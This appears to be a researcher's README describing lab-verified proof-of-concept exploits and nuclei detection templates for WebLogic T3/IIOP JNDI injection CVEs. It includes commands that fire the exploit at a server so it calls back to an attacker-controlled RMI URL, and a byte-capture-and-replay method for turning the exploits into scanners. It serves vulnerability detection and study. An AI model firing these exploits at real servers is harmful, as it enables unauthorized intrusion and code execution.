# WebLogic JNDI — lab-verified active PoC

Result of the "port-from-PoC + verify-in-lab" effort for the T3/IIOP JNDI CVEs.

## 1. What was verified ✅

| Item | Status |
|------|--------|
| Lab A | `container-registry.oracle.com/middleware/weblogic:12.2.1.4`, T3 on `127.0.0.1:7001`, HELO → `12.2.1.4.0` |
| Lab B | `container-registry.oracle.com/middleware/weblogic:14.1.1.0-dev-11`, T3 on `127.0.0.1:7101`, HELO → `14.1.1.0.0` |
| CVE-2023-21839 active nuclei template (upstream) | **MATCHED** on Lab A (interactsh DNS callback) |
| CVE-2024-20931 exploit — Java PoC | **FIRED** on Lab A — server JRMP/RMI callback (`0x4a524d49` = `JRMI`) |
| CVE-2024-20931 active nuclei template (`../Nuclei template/CVE-2024-20931-active-oast.yaml`) | **MATCHED on both Lab A AND Lab B** with identical bytes — see `../Nuclei template/README.md` |
| CVE-2024-21006 exploit — Java PoC | **FIRED** on Lab A (via client-side chain) |
| CVE-2024-21182 exploit — Java PoC | **FIRED** on Lab A (via client-side chain) |
| CVE-2024-21006 / 21182 **nuclei active OAST** | **NOT achievable** — exploit chain fires on the *client* that calls lookup, not on the WLS server. The capture→replay pipeline tested here cannot produce an OAST interaction. See §6. |

CVE-2024-20931 proof (listener output, Lab A):

```
[2026-10-01T16:53:15] CALLBACK from ('127.0.0.1', 63346)
    first-bytes: 4a524d4900024b   (JRMI => the WebLogic server dialed out)
```

## 2. Files

- `src/com/supeream/CVE_2024_20931.java` — parameterized PoC (target + attacker JNDI URL).
- `verify-listener.py` — OAST substitute: logs the server's callback (no internet needed).

## 3. How to run (reproduces the verification)

Compile + run **inside the WebLogic container** (it has JDK 8 + `weblogic.jar`; a normal client host works too if it has them):

```bash
docker cp src wls12214:/tmp/poc/src
docker exec wls12214 bash -lc 'cd /tmp/poc && javac -cp $ORACLE_HOME/wlserver/server/lib/weblogic.jar -d out src/com/supeream/CVE_2024_20931.java'
```

Start the listener on the host (OAST substitute):

```bash
python3 verify-listener.py
```

Fire it (container → host via `host.docker.internal`):

```bash
docker exec wls12214 bash -lc 'cd /tmp/poc && java -cp out:$ORACLE_HOME/wlserver/server/lib/weblogic.jar com.supeream.CVE_2024_20931 t3://127.0.0.1:7001 rmi://host.docker.internal:18099/a'
```

A `CALLBACK from ...` line = vulnerable. Against a real target use an interactsh/Burst
Collaborator host instead of `host.docker.internal:18099`.

## 4. How the nuclei JS port was done — pipeline

The CVE-2024-20931 active nuclei template was built by **capture → replay**, not
by re-implementing the T3/RMI state machine. The pipeline (reusable for other
T3/IIOP JNDI CVEs):

1. **Capture.** A transparent TCP proxy does **not** work — WebLogic's RJVM
   negotiates/validates peer addresses bidirectionally, so through a MITM the
   server stops after the 59-byte `HELO`. Inside the Oracle Linux 7.9 container
   there is no `strace`/`tcpdump` either (`NET_RAW` is dropped). The enabler is
   an in-process `LD_PRELOAD` shim (`sockdump.c`) that hooks libc
   `read`/`write`/`send`/`recv` and dumps per-fd buffers. Install `gcc` via
   `yum` as root (`docker exec -u 0 ...`) and build:
   ```sh
   gcc -shared -fPIC -o sockdump.so sockdump.c -ldl
   LD_PRELOAD=/tmp/poc/sockdump.so java com.supeream.CVE_2024_20931 ...
   ```
   Produces `cap_w_<fd>.bin` (client→server) and `cap_r_<fd>.bin` (server→client).

2. **Replay-friendly capture.** Re-run the PoC with a **fixed-width marker URL**
   (e.g. `rmi://` + 90 × `A` = 96 bytes). Later substituting any 96-byte URL
   keeps every T3 header + Java serialization length field valid — no length
   math needed.

3. **Replay as nuclei `javascript:`.** The template embeds `handshake` and
   `body` hex, does one `body.replace(mark_hex, url_hex)`, sends on a single
   socket, and holds the connection open with `c.RecvFull(1000000)` so the
   server completes the lookup+callback before `Close()` (closing too early is
   why the first drafts "No results found" despite correct bytes). The attacker
   URL is `rmi://{{interactsh-url}}:1099/` padded to 96 bytes.

4. **Sign the template** — nuclei refuses unsigned `javascript:` templates.
   `nuclei -sign -t <file>` once (empty passphrase OK), then
   `nuclei -t <file> -u target:7001`.

## 5. Version independence (why one capture covers 12.2.1.4 and 14.1.1)

Decompiling `weblogic.deployment.jms.ForeignOpaqueReference` from `weblogic.jar`:

```
$ javap -p weblogic.deployment.jms.ForeignOpaqueReference | grep serialVersionUID
  static final long serialVersionUID;

$ serialver weblogic.deployment.jms.ForeignOpaqueReference
  = 4404892619941441265L     # 0x3d21527fed596ef1
```

The exact byte sequence `3d 21 52 7f ed 59 6e f1` appears on the wire too — UID
is a **hard-coded constant** (so Oracle's own Foreign JMS configurations keep
serializing compatibly across releases). Hence replaying the 12.2.1.4 stream
against 14.1.1 works unchanged (empirically confirmed above). If a future
version ever changes the UID, add a `HELO`-based branch — the handshake reports
the server version precisely.

## 6. Why 21006 / 21182 could NOT be turned into nuclei active-OAST templates

The same pipeline was tried on both CVEs; both Java PoCs fire a callback on Lab A,
and both captures replay cleanly on the wire — but **no OAST interaction is
produced**. Root cause is the gadget class, not the pipeline.

WebLogic's server-side `NamingNode.lookup()` only calls `.getReferent()` for
objects it treats as resolve-eagerly. The three gadgets here differ:

| CVE | Gadget | Implements | Server resolves on lookup? |
|-----|--------|-----------|----------------------------|
| 2024-20931 | `weblogic.deployment.jms.ForeignOpaqueReference` | **`weblogic.jndi.OpaqueReference`** directly | **YES** → server dials attacker URL → OAST hit |
| 2024-21182 | `weblogic.ejb.container.internal.AggregatableOpaqueReference` | `weblogic.jndi.ClassTypeOpaqueReference` + `AggregatableInternal` | **NO** → cluster-aware; `writeObject` embeds the writer's local JVMID; server treats foreign JVMIDs as *do-not-resolve* and ships the Reference back for the client to resolve |
| 2024-21006 | `weblogic.application.naming.MessageDestinationReference` | plain `javax.naming.Reference` subclass | **NO** → server returns the Reference verbatim |

Direct evidence from Lab A: when the real Java PoC for 21182 or 21006 fires a
callback, inspecting the server's lookup response shows the attacker URL (e.g.
`rmi://host.docker.internal:18099/A...`) **echoed back inside the response
blob** — i.e. the server never dialed it. The DNS/JRMI call happens *after*
the Java client's `NamingManager.getObjectInstance()` processes the returned
Reference. A nuclei scanner is a byte pusher, not a JNDI client, so it cannot
reproduce that step. The CVE primitive itself is still real — it is the
"attacker binds a poisoned reference → a legitimate victim later looks it up and
is owned" vector — just not scanner-detectable from the outside like 20931 is.

What is kept in `../Nuclei template/`:

- `CVE-2024-20931-active-oast.yaml` — active OAST (verified both labs).
- `CVE-2024-21006.yaml`, `CVE-2024-21182.yaml` — T3-handshake version-detect only.
